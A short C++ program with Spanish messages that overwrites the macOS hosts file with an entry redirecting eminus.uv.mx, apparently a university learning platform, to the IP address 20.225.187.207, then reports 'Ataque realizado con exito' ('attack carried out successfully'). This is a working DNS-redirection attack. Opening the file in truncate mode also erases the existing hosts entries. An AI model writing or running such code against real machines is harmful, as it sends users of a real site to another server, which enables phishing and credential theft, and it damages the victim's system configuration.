#include <iostream>
#include <fstream>
using namespace std;

int main()
{
    ofstream myfile ("/private/etc/hosts");

    if (myfile.is_open())
    {
        myfile << "\n20.225.187.207 eminus.uv.mx";
        myfile.close();
        cout << "Ataque realizado con exito";
    }
    else
    {
        cout << "El programa requiere permisos de administracion. \n";
    }

    cout << "Presione la tecla enter para salir...\n";

    cin.get();

    return 0;
}